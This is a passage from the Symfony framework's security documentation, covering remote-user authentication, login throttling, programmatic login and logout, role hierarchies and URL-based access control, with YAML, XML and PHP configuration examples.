server\nmodules that pre-authenticate a user (e.g. kerberos). The remote user\nauthenticator provides a basic integration for these services.\n\nThese modules often expose the authenticated user in the ``REMOTE_USER``\nenvironment variable. The remote user authenticator uses this value as the\nuser identifier to load the corresponding user.\n\nEnable remote user authentication using the ``remote_user`` key:\n\n.. configuration-block::\n\n    .. code-block:: yaml\n\n        # config/packages/security.yaml\n        security:\n            firewalls:\n                main:\n                    # ...\n                    remote_user:\n                        provider: your_user_provider\n\n    .. code-block:: xml\n\n        <!-- config/packages/security.xml -->\n        <?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n        <srv:container xmlns=\"http://symfony.com/schema/dic/security\"\n            xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n            xmlns:srv=\"http://symfony.com/schema/dic/services\"\n            xsi:schemaLocation=\"http://symfony.com/schema/dic/services\n                https://symfony.com/schema/dic/services/services-1.0.xsd\n                http://symfony.com/schema/dic/security\n                https://symfony.com/schema/dic/security/security-1.0.xsd\">\n\n            <config>\n                <firewall name=\"main\">\n                    <remote-user provider=\"your_user_provider\"/>\n                </firewall>\n            </config>\n        </srv:container>\n\n    .. code-block:: php\n\n        // config/packages/security.php\n        use Symfony\\Config\\SecurityConfig;\n\n        return static function (SecurityConfig $security): void {\n            $mainFirewall = $security->firewall('main');\n            $mainFirewall->remoteUser()\n                ->provider('your_user_provider')\n            ;\n        };\n\n.. tip::\n\n    You can customize the name of this server variable under the\n    ``remote_user`` key. See\n    :ref:`the configuration reference <reference-security-firewall-remote-user>`\n    for more details.\n\n.. _security-login-throttling:\n\nLimiting Login Attempts\n~~~~~~~~~~~~~~~~~~~~~~~\n\nSymfony provides basic protection against `brute force login attacks`_ thanks to\nthe :doc:`Rate Limiter component </rate_limiter>`. If you haven't used this\ncomponent in your application yet, install it before using this feature:\n\n.. code-block:: terminal\n\n    $ composer require symfony/rate-limiter\n\nThen, enable this feature using the ``login_throttling`` setting:\n\n.. configuration-block::\n\n    .. code-block:: yaml\n\n        # config/packages/security.yaml\n        security:\n\n            firewalls:\n                # ...\n\n                main:\n                    # ...\n\n                    # by default, the feature allows 5 login attempts per minute\n                    login_throttling: null\n\n                    # configure the maximum login attempts\n                    login_throttling:\n                        max_attempts: 3          # per minute ...\n                        # interval: '15 minutes' # ... or in a custom period\n\n                    # use a custom rate limiter via its service ID\n                    login_throttling:\n                        limiter: app.my_login_rate_limiter\n\n    .. code-block:: xml\n\n        <!-- config/packages/security.xml -->\n        <?xml version=\"1.0\" encoding=\"UTF-8\"?>\n        <srv:container xmlns=\"http://symfony.com/schema/dic/security\"\n            xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n            xmlns:srv=\"http://symfony.com/schema/dic/services\"\n            xsi:schemaLocation=\"http://symfony.com/schema/dic/services\n                https://symfony.com/schema/dic/services/services-1.0.xsd\n                http://symfony.com/schema/dic/security\n                https://symfony.com/schema/dic/security/security-1.0.xsd\">\n\n            <!-- you must use the authenticator manager -->\n            <config enable-authenticator-manager=\"true\">\n                <!-- ... -->\n\n                <firewall name=\"main\">\n                    <!-- by default, the feature allows 5 login attempts per minute\n                         max-attempts: (optional) You can configure the maximum attempts ...\n                         interval:     (optional) ... and the period of time. -->\n                    <login-throttling max-attempts=\"3\" interval=\"15 minutes\"/>\n\n                    <!-- use a custom rate limiter via its service ID -->\n                    <login-throttling limiter=\"app.my_login_rate_limiter\"/>\n                </firewall>\n            </config>\n        </srv:container>\n\n    .. code-block:: php\n\n        // config/packages/security.php\n        use Symfony\\Config\\SecurityConfig;\n\n        return static function (SecurityConfig $security): void {\n            $security->enableAuthenticatorManager(true);\n\n            $mainFirewall = $security->firewall('main');\n\n            // by default, the feature allows 5 login attempts per minute\n            $mainFirewall->loginThrottling()\n                // ->maxAttempts(3)         // Optional: You can configure the maximum attempts ...\n                // ->interval('15 minutes') // ... and the period of time.\n            ;\n        };\n\n.. note::\n\n    The value of the ``interval`` option must be a number followed by any of the\n    units accepted by the `PHP date relative formats`_ (e.g. ``3 seconds``,\n    ``10 hours``, ``1 day``, etc.)\n\nInternally, Symfony uses the :doc:`Rate Limiter component </rate_limiter>`\nwhich by default uses Symfony's cache to store the previous login attempts.\nHowever, you can implement a :ref:`custom storage <rate-limiter-storage>`.\n\nLogin attempts are limited on ``max_attempts`` (default: 5)\nfailed requests for ``IP address + username`` and ``5 * max_attempts``\nfailed requests for ``IP address``. The second limit protects against an\nattacker using multiple usernames from bypassing the first limit, without\ndisrupting normal users on big networks (such as offices).\n\n.. tip::\n\n    Limiting the failed login attempts is only one basic protection against\n    brute force attacks. The `OWASP Brute Force Attacks`_ guidelines mention\n    several other protections that you should consider depending on the\n    level of protection required.\n\nIf you need a more complex limiting algorithm, create a class that implements\n:class:`Symfony\\\\Component\\\\HttpFoundation\\\\RateLimiter\\\\RequestRateLimiterInterface`\n(or use\n:class:`Symfony\\\\Component\\\\Security\\\\Http\\\\RateLimiter\\\\DefaultLoginRateLimiter`)\nand set the ``limiter`` option to its service ID:\n\n.. configuration-block::\n\n    .. code-block:: yaml\n\n        # config/packages/security.yaml\n        framework:\n            rate_limiter:\n                # define 2 rate limiters (one for username+IP, the other for IP)\n                username_ip_login:\n                    policy: token_bucket\n                    limit: 5\n                    rate: { interval: '5 minutes' }\n\n                ip_login:\n                    policy: sliding_window\n                    limit: 50\n                    interval: '15 minutes'\n\n        services:\n            # our custom login rate limiter\n            app.login_rate_limiter:\n                class: Symfony\\Component\\Security\\Http\\RateLimiter\\DefaultLoginRateLimiter\n                arguments:\n                    # globalFactory is the limiter for IP\n                    $globalFactory: '@limiter.ip_login'\n                    # localFactory is the limiter for username+IP\n                    $localFactory: '@limiter.username_ip_login'\n                    $secret: '%kernel.secret%'\n\n        security:\n            firewalls:\n                main:\n                    # use a custom rate limiter via its service ID\n                    login_throttling:\n                        limiter: app.login_rate_limiter\n\n    .. code-block:: xml\n\n        <!-- config/packages/security.xml -->\n        <?xml version=\"1.0\" encoding=\"UTF-8\"?>\n        <srv:container xmlns=\"http://symfony.com/schema/dic/security\"\n            xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n            xmlns:framework=\"http://symfony.com/schema/dic/symfony\"\n            xmlns:srv=\"http://symfony.com/schema/dic/services\"\n            xsi:schemaLocation=\"http://symfony.com/schema/dic/services\n                https://symfony.com/schema/dic/services/services-1.0.xsd\n                http://symfony.com/schema/dic/symfony\n                https://symfony.com/schema/dic/symfony/symfony-1.0.xsd\n                http://symfony.com/schema/dic/security\n                https://symfony.com/schema/dic/security/security-1.0.xsd\">\n\n            <framework:config>\n                <framework:rate-limiter>\n                    <!-- define 2 rate limiters (one for username+IP, the other for IP) -->\n                    <framework:limiter name=\"username_ip_login\"\n                        policy=\"token_bucket\"\n                        limit=\"5\"\n                    >\n                        <framework:rate interval=\"5 minutes\"/>\n                    </framework:limiter>\n\n                    <framework:limiter name=\"ip_login\"\n                        policy=\"sliding_window\"\n                        limit=\"50\"\n                        interval=\"15 minutes\"\n                    />\n                </framework:rate-limiter>\n            </framework:config>\n\n            <srv:services>\n                <!-- our custom login rate limiter -->\n                <srv:service id=\"app.login_rate_limiter\"\n                    class=\"Symfony\\Component\\Security\\Http\\RateLimiter\\DefaultLoginRateLimiter\"\n                >\n                    <!-- 1st argument is the limiter for IP -->\n                    <srv:argument type=\"service\" id=\"limiter.ip_login\"/>\n                    <!-- 2nd argument is the limiter for username+IP -->\n                    <srv:argument type=\"service\" id=\"limiter.username_ip_login\"/>\n                    <!-- 3rd argument is the app secret -->\n                    <srv:argument type=\"string\">%kernel.secret%</srv:argument>\n                </srv:service>\n            </srv:services>\n\n            <config>\n                <firewall name=\"main\">\n                    <!-- use a custom rate limiter via its service ID -->\n                    <login-throttling limiter=\"app.login_rate_limiter\"/>\n                </firewall>\n            </config>\n        </srv:container>\n\n    .. code-block:: php\n\n        // config/packages/security.php\n        use Symfony\\Component\\DependencyInjection\\ContainerBuilder;\n        use Symfony\\Component\\DependencyInjection\\Reference;\n        use Symfony\\Component\\Security\\Http\\RateLimiter\\DefaultLoginRateLimiter;\n        use Symfony\\Config\\FrameworkConfig;\n        use Symfony\\Config\\SecurityConfig;\n\n        return static function (ContainerBuilder $container, FrameworkConfig $framework, SecurityConfig $security): void {\n            $framework->rateLimiter()\n                ->limiter('username_ip_login')\n                    ->policy('token_bucket')\n                    ->limit(5)\n                    ->rate()\n                        ->interval('5 minutes')\n            ;\n\n            $framework->rateLimiter()\n                ->limiter('ip_login')\n                    ->policy('sliding_window')\n                    ->limit(50)\n                    ->interval('15 minutes')\n            ;\n\n            $container->register('app.login_rate_limiter', DefaultLoginRateLimiter::class)\n                ->setArguments([\n                    // 1st argument is the limiter for IP\n                    new Reference('limiter.ip_login'),\n                    // 2nd argument is the limiter for username+IP\n                    new Reference('limiter.username_ip_login'),\n                    // 3rd argument is the app secret\n                    param('kernel.secret'),\n                ]);\n\n            $security->firewall('main')\n                ->loginThrottling()\n                    ->limiter('app.login_rate_limiter')\n            ;\n        };\n\nCustomize Successful and Failed Authentication Behavior\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\nIf you want to customize how the successful or failed authentication process is\nhandled, you don't have to overwrite the respective listeners globally. Instead,\nyou can set custom success failure handlers by implementing the\n:class:`Symfony\\\\Component\\\\Security\\\\Http\\\\Authentication\\\\AuthenticationSuccessHandlerInterface`\nor the\n:class:`Symfony\\\\Component\\\\Security\\\\Http\\\\Authentication\\\\AuthenticationFailureHandlerInterface`.\n\nRead :ref:`how to customize your success handler <login-link_customize-success-handler>`\nfor more information about this.\n\nLogin Programmatically\n----------------------\n\nYou can log in a user programmatically using the ``login()`` method of the\n:class:`Symfony\\\\Bundle\\\\SecurityBundle\\\\Security` helper::\n\n    // src/Controller/SecurityController.php\n    namespace App\\Controller;\n\n    use App\\Security\\Authenticator\\ExampleAuthenticator;\n    use Symfony\\Bundle\\SecurityBundle\\Security;\n    use Symfony\\Component\\Security\\Http\\Authenticator\\Passport\\Badge\\RememberMeBadge;\n\n    class SecurityController\n    {\n        public function someAction(Security $security): Response\n        {\n            // get the user to be authenticated\n            $user = ...;\n\n            // log the user in on the current firewall\n            $security->login($user);\n\n            // if the firewall has more than one authenticator, you must pass it explicitly\n            // by using the name of built-in authenticators...\n            $security->login($user, 'form_login');\n            // ...or the service id of custom authenticators\n            $security->login($user, ExampleAuthenticator::class);\n\n            // you can also log in on a different firewall...\n            $security->login($user, 'form_login', 'other_firewall');\n\n            // ...and add badges\n            $security->login($user, 'form_login', 'other_firewall', [(new RememberMeBadge())->enable()]);\n\n            // use the redirection logic applied to regular login\n            $redirectResponse = $security->login($user);\n            return $redirectResponse;\n\n            // or use a custom redirection logic (e.g. redirect users to their account page)\n            // return new RedirectResponse('...');\n        }\n    }\n\n.. _security-logging-out:\n\nLogging Out\n-----------\n\nTo enable logging out, activate the  ``logout`` config parameter under your firewall:\n\n.. configuration-block::\n\n    .. code-block:: yaml\n\n        # config/packages/security.yaml\n        security:\n            # ...\n\n            firewalls:\n                main:\n                    # ...\n                    logout:\n                        path: /logout\n\n                        # where to redirect after logout\n                        # target: app_any_route\n\n    .. code-block:: xml\n\n        <!-- config/packages/security.xml -->\n        <?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n        <srv:container xmlns=\"http://symfony.com/schema/dic/security\"\n            xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n            xmlns:srv=\"http://symfony.com/schema/dic/services\"\n            xsi:schemaLocation=\"http://symfony.com/schema/dic/services\n                https://symfony.com/schema/dic/services/services-1.0.xsd\n                http://symfony.com/schema/dic/security\n                https://symfony.com/schema/dic/security/security-1.0.xsd\">\n\n            <config>\n                <!-- ... -->\n\n                <firewall name=\"main\">\n                    <logout path=\"/logout\"/>\n\n                    <!-- use \"target\" to configure where to redirect after logout\n                    <logout path=\"/logout\" target=\"app_any_route\"/>\n                    -->\n                </firewall>\n            </config>\n        </srv:container>\n\n    .. code-block:: php\n\n        // config/packages/security.php\n        use Symfony\\Config\\SecurityConfig;\n\n        return static function (SecurityConfig $security): void {\n            // ...\n\n            $mainFirewall = $security->firewall('main');\n            // ...\n            $mainFirewall->logout()\n                ->path('/logout')\n\n                // where to redirect after logout\n                // ->target('app_any_route')\n            ;\n        };\n\nSymfony will then un-authenticate users navigating to the configured ``path``,\nand redirect them to the configured ``target``.\n\n.. tip::\n\n    If you need to reference the logout path, you can use the ``_logout_<firewallname>``\n    route name (e.g. ``_logout_main``).\n\nIf your project does not use :ref:`Symfony Flex <symfony-flex>`, make sure\nyou have imported the logout route loader in your routes:\n\n.. configuration-block::\n\n    .. code-block:: yaml\n\n        # config/routes/security.yaml\n        _symfony_logout:\n            resource: security.route_loader.logout\n            type: service\n\n    .. code-block:: xml\n\n        <!-- config/routes/security.xml -->\n        <?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n        <routes xmlns=\"http://symfony.com/schema/routing\"\n            xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n            xsi:schemaLocation=\"http://symfony.com/schema/routing\n                https://symfony.com/schema/routing/routing-1.0.xsd\">\n\n            <import resource=\"security.route_loader.logout\" type=\"service\"/>\n        </routes>\n\n    .. code-block:: php\n\n        // config/routes/security.php\n        use Symfony\\Component\\Routing\\Loader\\Configurator\\RoutingConfigurator;\n\n        return static function (RoutingConfigurator $routes): void {\n            $routes->import('security.route_loader.logout', 'service');\n        };\n\nLogout programmatically\n~~~~~~~~~~~~~~~~~~~~~~~\n\nYou can logout user programmatically using the ``logout()`` method of the\n:class:`Symfony\\\\Bundle\\\\SecurityBundle\\\\Security` helper::\n\n    // src/Controller/SecurityController.php\n    namespace App\\Controller\\SecurityController;\n\n    use Symfony\\Bundle\\SecurityBundle\\Security;\n\n    class SecurityController\n    {\n        public function someAction(Security $security): Response\n        {\n            // logout the user in on the current firewall\n            $response = $security->logout();\n\n            // you can also disable the csrf logout\n            $response = $security->logout(false);\n\n            // ... return $response (if set) or e.g. redirect to the homepage\n        }\n    }\n\nThe user will be logged out from the firewall of the request. If the request is\nnot behind a firewall a ``\\LogicException`` will be thrown.\n\nCustomizing Logout\n~~~~~~~~~~~~~~~~~~\n\nIn some cases you need to run extra logic upon logout (e.g. invalidate\nsome tokens) or want to customize what happens after a logout. During\nlogout, a :class:`Symfony\\\\Component\\\\Security\\\\Http\\\\Event\\\\LogoutEvent`\nis dispatched. Register an :doc:`event listener or subscriber </event_dispatcher>`\nto execute custom logic::\n\n    // src/EventListener/LogoutSubscriber.php\n    namespace App\\EventListener;\n\n    use Symfony\\Component\\EventDispatcher\\EventSubscriberInterface;\n    use Symfony\\Component\\HttpFoundation\\RedirectResponse;\n    use Symfony\\Component\\Routing\\Generator\\UrlGeneratorInterface;\n    use Symfony\\Component\\Security\\Http\\Event\\LogoutEvent;\n\n    class LogoutSubscriber implements EventSubscriberInterface\n    {\n        public function __construct(\n            private UrlGeneratorInterface $urlGenerator\n        ) {\n        }\n\n        public static function getSubscribedEvents(): array\n        {\n            return [LogoutEvent::class => 'onLogout'];\n        }\n\n        public function onLogout(LogoutEvent $event): void\n        {\n            // get the security token of the session that is about to be logged out\n            $token = $event->getToken();\n\n            // get the current request\n            $request = $event->getRequest();\n\n            // get the current response, if it is already set by another listener\n            $response = $event->getResponse();\n\n            // configure a custom logout response to the homepage\n            $response = new RedirectResponse(\n                $this->urlGenerator->generate('homepage'),\n                RedirectResponse::HTTP_SEE_OTHER\n            );\n            $event->setResponse($response);\n        }\n    }\n\nCustomizing Logout Path\n~~~~~~~~~~~~~~~~~~~~~~~\n\nAnother option is to configure ``path`` as a route name. This can be useful\nif you want logout URIs to be dynamic (e.g. translated according to the\ncurrent locale). In that case, you have to create this route yourself:\n\n.. configuration-block::\n\n    .. code-block:: yaml\n\n        # config/routes.yaml\n        app_logout:\n            path:\n                en: /logout\n                fr: /deconnexion\n            methods: GET\n\n    .. code-block:: xml\n\n        <!-- config/routes.xml -->\n        <?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n        <routes xmlns=\"http://symfony.com/schema/routing\"\n            xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n            xsi:schemaLocation=\"http://symfony.com/schema/routing\n                https://symfony.com/schema/routing/routing-1.0.xsd\">\n\n            <route id=\"app_logout\" path=\"/logout\" methods=\"GET\">\n                <path locale=\"en\">/logout</path>\n                <path locale=\"fr\">/deconnexion</path>\n            </route>\n        </routes>\n\n    .. code-block:: php\n\n        // config/routes.php\n        use Symfony\\Component\\Routing\\Loader\\Configurator\\RoutingConfigurator;\n\n        return function (RoutingConfigurator $routes): void {\n            $routes->add('app_logout', [\n                'en' => '/logout',\n                'fr' => '/deconnexion',\n            ])\n                ->methods(['GET'])\n            ;\n        };\n\nThen, pass the route name to the ``path`` option:\n\n.. configuration-block::\n\n    .. code-block:: yaml\n\n        # config/packages/security.yaml\n        security:\n            # ...\n\n            firewalls:\n                main:\n                    # ...\n                    logout:\n                        path: app_logout\n\n    .. code-block:: xml\n\n        <!-- config/packages/security.xml -->\n        <?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n        <srv:container xmlns=\"http://symfony.com/schema/dic/security\"\n            xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n            xmlns:srv=\"http://symfony.com/schema/dic/services\"\n            xsi:schemaLocation=\"http://symfony.com/schema/dic/services\n                https://symfony.com/schema/dic/services/services-1.0.xsd\n                http://symfony.com/schema/dic/security\n                https://symfony.com/schema/dic/security/security-1.0.xsd\">\n\n            <config>\n                <!-- ... -->\n\n                <firewall name=\"main\">\n                    <logout path=\"app_logout\"/>\n                </firewall>\n            </config>\n        </srv:container>\n\n    .. code-block:: php\n\n        // config/packages/security.php\n        use Symfony\\Config\\SecurityConfig;\n\n        return static function (SecurityConfig $security): void {\n            // ...\n\n            $mainFirewall = $security->firewall('main');\n            // ...\n            $mainFirewall->logout()\n                ->path('app_logout')\n            ;\n        };\n\n.. _retrieving-the-user-object:\n\nFetching the User Object\n------------------------\n\nAfter authentication, the ``User`` object of the current user can be\naccessed via the ``getUser()`` shortcut in the\n:ref:`base controller <the-base-controller-class-services>`::\n\n    use Symfony\\Bundle\\FrameworkBundle\\Controller\\AbstractController;\n    use Symfony\\Component\\HttpFoundation\\Response;\n\n    class ProfileController extends AbstractController\n    {\n        public function index(): Response\n        {\n            // usually you'll want to make sure the user is authenticated first,\n            // see \"Authorization\" below\n            $this->denyAccessUnlessGranted('IS_AUTHENTICATED_FULLY');\n\n            // returns your User object, or null if the user is not authenticated\n            // use inline documentation to tell your editor your exact User class\n            /** @var \\App\\Entity\\User $user */\n            $user = $this->getUser();\n\n            // Call whatever methods you've added to your User class\n            // For example, if you added a getFirstName() method, you can use that.\n            return new Response('Well hi there '.$user->getFirstName());\n        }\n    }\n\nFetching the User from a Service\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\nIf you need to get the logged in user from a service, use the\n:class:`Symfony\\\\Bundle\\\\SecurityBundle\\\\Security` service::\n\n    // src/Service/ExampleService.php\n    // ...\n\n    use Symfony\\Bundle\\SecurityBundle\\Security;\n\n    class ExampleService\n    {\n        // Avoid calling getUser() in the constructor: auth may not\n        // be complete yet. Instead, store the entire Security object.\n        public function __construct(\n            private Security $security,\n        ){\n        }\n\n        public function someMethod(): void\n        {\n            // returns User object or null if not authenticated\n            $user = $this->security->getUser();\n\n            // ...\n        }\n    }\n\nFetch the User in a Template\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\nIn a Twig Template the user object is available via the ``app.user`` variable\nthanks to the :ref:`Twig global app variable <twig-app-variable>`:\n\n.. code-block:: html+twig\n\n    {% if is_granted('IS_AUTHENTICATED_FULLY') %}\n        <p>Email: {{ app.user.email }}</p>\n    {% endif %}\n\n.. _denying-access-roles-and-other-authorization:\n.. _security-access-control:\n\nAccess Control (Authorization)\n------------------------------\n\nUsers can now log in to your app using your login form. Great! Now, you need to learn\nhow to deny access and work with the User object. This is called **authorization**,\nand its job is to decide if a user can access some resource (a URL, a model object,\na method call, ...).\n\nThe process of authorization has two different sides:\n\n#. The user receives a specific role when logging in (e.g. ``ROLE_ADMIN``).\n#. You add code so that a resource (e.g. URL, controller) requires a specific\n   \"attribute\" (e.g. a role like ``ROLE_ADMIN``) in order to be accessed.\n\nRoles\n~~~~~\n\nWhen a user logs in, Symfony calls the ``getRoles()`` method on your ``User``\nobject to determine which roles this user has. In the ``User`` class that\nwas generated earlier, the roles are an array that's stored in the\ndatabase and every user is *always* given at least one role: ``ROLE_USER``::\n\n    // src/Entity/User.php\n\n    // ...\n    class User\n    {\n        #[ORM\\Column(type: 'json')]\n        private array $roles = [];\n\n        // ...\n        public function getRoles(): array\n        {\n            $roles = $this->roles;\n            // guarantee every user at least has ROLE_USER\n            $roles[] = 'ROLE_USER';\n\n            return array_unique($roles);\n        }\n    }\n\nThis is a nice default, but you can do *whatever* you want to determine which roles\na user should have. The only rule is that every role **must start with** the\n``ROLE_`` prefix - otherwise, things won't work as expected. Other than that,\na role is just a string and you can invent whatever you need (e.g. ``ROLE_PRODUCT_ADMIN``).\n\nYou'll use these roles next to grant access to specific sections of your site.\n\n.. _security-role-hierarchy:\n\nHierarchical Roles\n..................\n\nInstead of giving many roles to each user, you can define role inheritance\nrules by creating a role hierarchy:\n\n.. configuration-block::\n\n    .. code-block:: yaml\n\n        # config/packages/security.yaml\n        security:\n            # ...\n\n            role_hierarchy:\n                ROLE_ADMIN:       ROLE_USER\n                ROLE_SUPER_ADMIN: [ROLE_ADMIN, ROLE_ALLOWED_TO_SWITCH]\n\n    .. code-block:: xml\n\n        <!-- config/packages/security.xml -->\n        <?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n        <srv:container xmlns=\"http://symfony.com/schema/dic/security\"\n            xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n            xmlns:srv=\"http://symfony.com/schema/dic/services\"\n            xsi:schemaLocation=\"http://symfony.com/schema/dic/services\n                https://symfony.com/schema/dic/services/services-1.0.xsd\n                http://symfony.com/schema/dic/security\n                https://symfony.com/schema/dic/security/security-1.0.xsd\">\n\n            <config>\n                <!-- ... -->\n\n                <role id=\"ROLE_ADMIN\">ROLE_USER</role>\n                <role id=\"ROLE_SUPER_ADMIN\">ROLE_ADMIN, ROLE_ALLOWED_TO_SWITCH</role>\n            </config>\n        </srv:container>\n\n    .. code-block:: php\n\n        // config/packages/security.php\n        use Symfony\\Config\\SecurityConfig;\n\n        return static function (SecurityConfig $security): void {\n            // ...\n\n            $security->roleHierarchy('ROLE_ADMIN', ['ROLE_USER']);\n            $security->roleHierarchy('ROLE_SUPER_ADMIN', ['ROLE_ADMIN', 'ROLE_ALLOWED_TO_SWITCH']);\n        };\n\nUsers with the ``ROLE_ADMIN`` role will also have the ``ROLE_USER`` role.\nUsers with ``ROLE_SUPER_ADMIN``, will automatically have ``ROLE_ADMIN``,\n``ROLE_ALLOWED_TO_SWITCH`` and ``ROLE_USER`` (inherited from\n``ROLE_ADMIN``).\n\n.. warning::\n\n    For role hierarchy to work, do not use ``$user->getRoles()`` manually.\n    For example, in a controller extending from the :ref:`base controller <the-base-controller-class-services>`::\n\n        // BAD - $user->getRoles() will not know about the role hierarchy\n        $hasAccess = in_array('ROLE_ADMIN', $user->getRoles());\n\n        // GOOD - use of the normal security methods\n        $hasAccess = $this->isGranted('ROLE_ADMIN');\n        $this->denyAccessUnlessGranted('ROLE_ADMIN');\n\n.. note::\n\n    The ``role_hierarchy`` values are static - you can't, for example, store the\n    role hierarchy in a database. If you need that, create a custom\n    :doc:`security voter </security/voters>` that looks for the user roles\n    in the database.\n\n.. _security-role-authorization:\n\nAdd Code to Deny Access\n~~~~~~~~~~~~~~~~~~~~~~~\n\nThere are **two** ways to deny access to something:\n\n#. :ref:`access_control in security.yaml <security-authorization-access-control>`\n   allows you to protect URL patterns (e.g. ``/admin/*``). Simpler, but less flexible;\n\n#. :ref:`in your controller (or other code) <security-securing-controller>`.\n\n.. _security-authorization-access-control:\n\nSecuring URL patterns (access_control)\n......................................\n\nThe most basic way to secure part of your app is to secure an entire URL pattern\nin ``security.yaml``. For example, to require ``ROLE_ADMIN`` for all URLs that\nstart with ``/admin``, you can:\n\n.. configuration-block::\n\n    .. code-block:: yaml\n\n        # config/packages/security.yaml\n        security:\n            # ...\n\n            firewalls:\n                # ...\n                main:\n                    # ...\n\n            access_control:\n                # require ROLE_ADMIN for /admin*\n                - { path: '^/admin', roles: ROLE_ADMIN }\n\n                # or require ROLE_ADMIN or IS_AUTHENTICATED_FULLY for /admin*\n                - { path: '^/admin', roles: [IS_AUTHENTICATED_FULLY, ROLE_ADMIN] }\n\n                # the 'path' value can be any valid regular expression\n                # (this one will match URLs like /api/post/7298 and /api/comment/528491)\n                - { path: ^/api/(post|comment)/\\d+$, roles: ROLE_USER }\n\n    .. code-block:: xml\n\n        <!-- config/packages/security.xml -->\n        <?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n        <srv:container xmlns=\"http://symfony.com/schema/dic/security\"\n            xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n            xmlns:srv=\"http://symfony.com/schema/dic/services\"\n            xsi:schemaLocation=\"http://symfony.com/schema/dic/services\n                https://symfony.com/schema/dic/services/services-1.0.xsd\n                http://symfony.com/schema/dic/security\n                https://symfony.com/schema/dic/security/security-1.0.xsd\">\n\n            <config>\n                <!-- ... -->\n\n                <firewall name=\"main\">\n                    <!-- ... -->\n                </firewall>\n\n                <!-- require ROLE_ADMIN for /admin* -->\n                <rule path=\"^/admin\" role=\"ROLE_ADMIN\"/>\n\n                <!-- require ROLE_ADMIN or IS_AUTHENTICATED_FULLY for /admin* -->\n                <rule path=\"^/admin\">\n                    <role>ROLE_ADMIN</role>\n                    <role>IS_AUTHENTICATED_FULLY</role>\n                </rule>\n\n                <!-- the 'path' value can be any valid regular expression\n                     (this one will match URLs like /api/post/7298 and /api/comment/528491) -->\n                <rule path=\"^/api/(post|comment)/\\d+$\" role=\"ROLE_USER\"/>\n            </config>\n        </srv:container>\n\n    .. code-block:: php\n\n        // config/packages/security.php\n        use Symfony\\Config\\SecurityConfig;\n\n        return static function (SecurityConfig $security): void {\n            $security->enableAuthenticatorManager(true);\n\n            // ...\n            $security->firewall('main')\n            // ...\n            ;\n\n            // require ROLE_ADMIN for /admin*\n            $security->accessControl()\n                ->path('^/admin')\n                ->roles(['ROLE_ADMIN']);\n\n            // require ROLE_ADMIN or IS_AUTHENTICATED_FULLY for /admin*\n            $security->accessControl()\n                ->path('^/admin')\n                ->roles(['ROLE_ADMIN', 'IS_AUTHENTICATED_FULLY']);\n\n            // the 'path' value can be any valid regular expression\n            // (this one will match URLs like /api/post/7298 and /api/comment/528491)\n            $security->accessControl()\n                ->path('^/api/(post|comment)/\\d+$')\n                ->roles(['ROLE_USER']);\n        };\n\nYou can define as many URL patterns as you need - each is a regular expression.\n**BUT**, only **one** will be matched per request: Symfony starts at the top of\nthe list and stops when it finds the first match:\n\n.. configuration-block::\n\n    .. code-block:: yaml\n\n        # config/packages/security.yaml\n        security:\n            # ...\n\n            access_control:\n                # matches /admin/users/*\n                - { path: '^/admin/users', roles: ROLE_SUPER_ADMIN }\n\n                # matches /admin/* except for anything matching the above rule\n                - { path: '^/admin', roles: ROLE_ADMIN }\n\n    .. code-block:: xml\n\n        <!-- config/packages/security.xml -->\n        <?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n        <srv:container xmlns=\"http://symfony.com/schema/dic/security\"\n            xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n            xmlns:srv=\"http://symfony.com/schema/dic/services\"\n            xsi:schemaLocation=\"http://symfony.com/schema/dic/services\n                https://symfony.com/schema/dic/services/services-1.0.xsd\n                http://symfony.com/schema/dic/security\n                https://symfony.com/schema/dic/security/security-1.0.xsd\">\n\n            <config>\n                <!-- ... -->\n\n                <rule path=\"^/admin/users\" role=\"ROLE_SUPER_ADMIN\"/>\n                <rule path=\"^/admin\" role=\"ROLE_ADMIN\"/>\n            </config>\n        </srv:container>\n\n    .. code-block:: php\n\n        // config/packages/security.php\n        use Symfony\\Config\\SecurityConfig;\n\n        return static function (SecurityConfig $security): void {\n            // ...\n\n            $security->accessControl()\n                ->path('^/admin/users')\n                ->roles(['ROLE_SUPER_ADMIN']);\n\n            $security->accessControl()\n                ->path('^/admin')\n                ->roles(['ROLE_ADMIN']);\n        };\n\nPrepending the path with ``^`` means that only URLs *beginning* with the\npattern are matched. For example, a path of ``/admin`` (without the ``^``)\nwould match ``/admin/foo`` but would also match URLs like ``/foo/admin``.\n\nEach ``access_control`` can also match on IP address, hostname and HTTP methods.\nIt can also be used to redirect a user to the ``https`` version of a URL pattern.\nFor more complex needs, you can also use a service implementing ``RequestMatcherInterface``.\n\nSee :doc:`/security/access_control`.\n\n.. _security-securing-controller:\n\nSecuring Controllers and other Code\n...................................\n\nYou can deny access from inside a controller::\n\n    // src/Controller/AdminController.php\n    // ...\n\n    public function adminDashboard(): Response\n    {\n        $this->denyAccessUnlessGranted('ROLE_ADMIN');\n\n        // or add an optional message - seen by developers\n        $this->denyAccessUnlessGranted('ROLE_ADMIN', null, 'User tried to access a page without having ROLE_ADMIN');\n    }\n\nThat's it! If access is not granted, a special\n:class:`Symfony\\\\Component\\\\Security\\\\Core\\\\Exception\\\\AccessDeniedException`\nis thrown and no more code in your controller is called. Then, one of two things\nwill happen:\n\n1) If the user isn't logged in yet, they will be asked to log in (e.g. redirected\n   to the login page).\n\n2) If the user *is* logged in, but does *not* have the ``ROLE_ADMIN`` role, they'll\n   be shown the 403 access denied page 